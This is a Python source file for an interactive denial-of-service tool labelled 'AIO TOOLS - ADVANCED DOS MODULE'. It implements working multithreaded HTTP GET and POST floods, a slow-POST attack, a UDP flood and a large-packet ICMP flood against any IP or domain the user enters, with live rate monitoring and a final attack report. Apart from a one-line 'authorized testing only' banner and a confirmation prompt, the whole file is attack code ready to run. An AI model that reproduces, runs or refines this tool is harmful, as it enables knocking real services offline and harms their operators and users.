import socket
import threading
import time
import random
import sys
import os
from datetime import datetime

class AdvancedDOSTool:
    def __init__(self):
        self.active = False
        self.metrics = {
            'requests': 0,
            'successful': 0,
            'failed': 0,
            'bytes_transferred': 0,
            'start_time': None
        }
        self.attack_patterns = []
        self.load_attack_patterns()
    
    def load_attack_patterns(self):
        self.attack_patterns = [
            {
                'name': 'HTTP GET Flood',
                'description': 'Standard HTTP GET requests flood',
                'layer': 7,
                'intensity': 'high'
            },
            {
                'name': 'POST Data Flood',
                'description': 'HTTP POST requests with random data',
                'layer': 7,
                'intensity': 'medium'
            },
            {
                'name': 'Slow POST',
                'description': 'Slow sending of POST data',
                'layer': 7,
                'intensity': 'low'
            },
            {
                'name': 'UDP Flood',
                'description': 'UDP packet flood',
                'layer': 4,
                'intensity': 'high'
            },
            {
                'name': 'ICMP Flood',
                'description': 'Ping flood attack',
                'layer': 3,
                'intensity': 'medium'
            }
        ]
    
    def display_patterns(self):
        print("\nAvailable Attack Patterns:")
        for i, pattern in enumerate(self.attack_patterns, 1):
            layer_tag = f"L{pattern['layer']}"
            intensity_color = {
                'high': '\033[91m',   # Red
                'medium': '\033[93m', # Yellow
                'low': '\033[92m'     # Green
            }.get(pattern['intensity'], '\033[97m')
            
            reset = '\033[0m'
            print(f"{i}. [{layer_tag}] {intensity_color}{pattern['name']}{reset}")
            print(f"   └─ {pattern['description']}")
    
    def http_get_flood(self, target_ip, target_port, worker_id):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        paths = [
            '/', '/index.html', '/home', '/api', '/admin',
            '/wp-admin', '/login', '/register', '/search'
        ]
        
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                
                path = random.choice(paths)
                user_agent = random.choice(user_agents)
                
                request = (
                    f"GET {path}?rnd={random.randint(1, 1000000)} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                
                sock.send(request.encode())
                self.metrics['bytes_transferred'] += len(request)
                self.metrics['requests'] += 1
                self.metrics['successful'] += 1
                
                if self.metrics['requests'] % 100 == 0 and worker_id == 0:
                    elapsed = (datetime.now() - self.metrics['start_time']).total_seconds()
                    rate = self.metrics['requests'] / elapsed if elapsed > 0 else 0
                    print(f"[Worker-{worker_id}] Requests: {self.metrics['requests']} | Rate: {rate:.1f}/s")
                
                sock.close()
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception as e:
                self.metrics['failed'] += 1
                if self.metrics['failed'] % 50 == 0 and worker_id == 0:
                    print(f"[Worker-{worker_id}] Failed connections: {self.metrics['failed']}")
                time.sleep(0.5)
    
    def post_data_flood(self, target_ip, target_port, worker_id):
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                
                data_size = random.randint(100, 5000)
                random_data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=data_size))
                
                request = (
                    f"POST /submit.php HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(random_data)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                    f"{random_data}"
                )
                
                sock.send(request.encode())
                self.metrics['bytes_transferred'] += len(request)
                self.metrics['requests'] += 1
                self.metrics['successful'] += 1
                
                sock.close()
                time.sleep(random.uniform(0.05, 0.2))
                
            except Exception:
                self.metrics['failed'] += 1
                time.sleep(0.3)
    
    def slow_post_attack(self, target_ip, target_port, worker_id):
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((target_ip, target_port))
                
                headers = (
                    f"POST /upload.php HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n"
                    f"Content-Length: 1000000\r\n"
                    f"\r\n"
                )
                
                sock.send(headers.encode())
                
                bytes_sent = 0
                while self.active and bytes_sent < 10000:
                    chunk = 'A' * random.randint(10, 100)
                    sock.send(chunk.encode())
                    bytes_sent += len(chunk)
                    self.metrics['bytes_transferred'] += len(chunk)
                    time.sleep(random.uniform(1, 5))
                
                self.metrics['requests'] += 1
                self.metrics['successful'] += 1
                sock.close()
                
            except Exception:
                self.metrics['failed'] += 1
                time.sleep(2)
    
    def udp_flood(self, target_ip, target_port, worker_id):
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                data_size = random.randint(64, 1500)
                random_data = bytes([random.randint(0, 255) for _ in range(data_size)])
                
                sock.sendto(random_data, (target_ip, target_port))
                
                self.metrics['bytes_transferred'] += data_size
                self.metrics['requests'] += 1
                self.metrics['successful'] += 1
                
                if self.metrics['requests'] % 500 == 0 and worker_id == 0:
                    print(f"[UDP-{worker_id}] Packets: {self.metrics['requests']}")
                
                time.sleep(0.001)
                
            except Exception:
                self.metrics['failed'] += 1
                time.sleep(0.1)
    
    def icmp_flood(self, target_ip, worker_id):
        import subprocess
        import platform
        
        system_platform = platform.system().lower()
        
        while self.active:
            try:
                if system_platform == 'windows':
                    subprocess.run(['ping', '-n', '1', '-l', '65500', target_ip], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    subprocess.run(['ping', '-c', '1', '-s', '65500', target_ip], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                self.metrics['bytes_transferred'] += 65500
                self.metrics['requests'] += 1
                self.metrics['successful'] += 1
                
                if self.metrics['requests'] % 50 == 0 and worker_id == 0:
                    print(f"[ICMP-{worker_id}] Pings: {self.metrics['requests']}")
                
                time.sleep(0.1)
                
            except Exception:
                self.metrics['failed'] += 1
                time.sleep(0.5)
    
    def monitor_attack(self):
        while self.active:
            elapsed = (datetime.now() - self.metrics['start_time']).total_seconds()
            
            if elapsed > 0:
                req_per_sec = self.metrics['requests'] / elapsed
                success_rate = (self.metrics['successful'] / self.metrics['requests'] * 100) if self.metrics['requests'] > 0 else 0
                mb_transferred = self.metrics['bytes_transferred'] / (1024 * 1024)
                mb_per_sec = mb_transferred / elapsed
                
                print(f"\n[Monitor] Time: {elapsed:.1f}s | Requests: {self.metrics['requests']} "
                      f"| Success: {success_rate:.1f}% | Data: {mb_transferred:.2f}MB "
                      f"| Rate: {req_per_sec:.1f} req/s | BW: {mb_per_sec:.2f} MB/s")
            
            time.sleep(2)
    
    def start_dos_attack(self, target_ip, target_port=80, pattern=1, threads=20, duration=30):
        print(f"\n[AIO DOS] Initializing attack on {target_ip}:{target_port}")
        print(f"Pattern: {self.attack_patterns[pattern-1]['name']}")
        print(f"Threads: {threads} | Duration: {duration}s")
        
        self.active = True
        self.metrics['start_time'] = datetime.now()
        self.metrics['requests'] = 0
        self.metrics['successful'] = 0
        self.metrics['failed'] = 0
        self.metrics['bytes_transferred'] = 0
        
        monitor_thread = threading.Thread(target=self.monitor_attack, daemon=True)
        monitor_thread.start()
        
        worker_threads = []
        attack_method = None
        
        if pattern == 1:
            attack_method = self.http_get_flood
        elif pattern == 2:
            attack_method = self.post_data_flood
        elif pattern == 3:
            attack_method = self.slow_post_attack
            threads = min(threads, 10)
        elif pattern == 4:
            attack_method = self.udp_flood
        elif pattern == 5:
            attack_method = self.icmp_flood
            target_port = 0
        else:
            attack_method = self.http_get_flood
        
        for i in range(threads):
            worker = threading.Thread(
                target=attack_method,
                args=(target_ip, target_port, i),
                daemon=True
            )
            worker_threads.append(worker)
            worker.start()
            time.sleep(0.05)
        
        print(f"[INFO] {len(worker_threads)} attack threads launched")
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[INTERRUPT] Attack stopped manually")
        
        self.active = False
        print("[STOPPING] Terminating attack threads...")
        time.sleep(3)
        
        final_time = (datetime.now() - self.metrics['start_time']).total_seconds()
        
        print("\n" + "="*70)
        print("DOS ATTACK REPORT")
        print("="*70)
        print(f"Target: {target_ip}:{target_port if target_port > 0 else 'N/A'}")
        print(f"Attack Pattern: {self.attack_patterns[pattern-1]['name']}")
        print(f"Duration: {final_time:.1f} seconds")
        print(f"Total Requests: {self.metrics['requests']}")
        print(f"Successful: {self.metrics['successful']} ({self.metrics['successful']/self.metrics['requests']*100:.1f}%)")
        print(f"Failed: {self.metrics['failed']} ({self.metrics['failed']/self.metrics['requests']*100:.1f}%)")
        print(f"Data Transferred: {self.metrics['bytes_transferred']/(1024*1024):.2f} MB")
        print(f"Average Rate: {self.metrics['requests']/final_time:.1f} requests/second")
        print(f"Bandwidth Used: {self.metrics['bytes_transferred']/final_time/(1024*1024):.2f} MB/s")
        print("="*70)
        
        return self.metrics

def main():
    print("\n" + "="*70)
    print("AIO TOOLS - ADVANCED DOS MODULE")
    print("="*70)
    print("IMPORTANT: For authorized testing only!")
    print("="*70)
    
    tool = AdvancedDOSTool()
    tool.display_patterns()
    
    try:
        target = input("\nEnter target IP or domain: ").strip()
        if not target:
            print("[ERROR] Target required")
            return
        
        try:
            target_ip = socket.gethostbyname(target)
        except:
            target_ip = target
        
        port_input = input("Enter target port (default 80): ").strip()
        target_port = int(port_input) if port_input.isdigit() else 80
        
        pattern_input = input("Select attack pattern (1-5, default 1): ").strip()
        pattern = int(pattern_input) if pattern_input.isdigit() and 1 <= int(pattern_input) <= 5 else 1
        
        threads_input = input("Number of threads (default 15): ").strip()
        threads = int(threads_input) if threads_input.isdigit() else 15
        
        duration_input = input("Attack duration in seconds (default 25): ").strip()
        duration = int(duration_input) if duration_input.isdigit() else 25
        
        print(f"\n[SUMMARY]")
        print(f"Target: {target_ip}:{target_port}")
        print(f"Pattern: {tool.attack_patterns[pattern-1]['name']}")
        print(f"Threads: {threads} | Duration: {duration}s")
        
        confirm = input("\nType 'CONFIRM' to start attack: ").strip()
        
        if confirm.upper() == "CONFIRM":
            print("\n[INITIALIZING] Attack starting in 3 seconds...\n")
            time.sleep(3)
            
            tool.start_dos_attack(target_ip, target_port, pattern, threads, duration)
        else:
            print("[CANCELLED] Attack aborted")
    
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Operation cancelled")
    except Exception as e:
        print(f"[ERROR] {e}")
    
    print("\n[FINISHED] Returning to main menu...")
    time.sleep(2)

if __name__ == "__main__":
    main()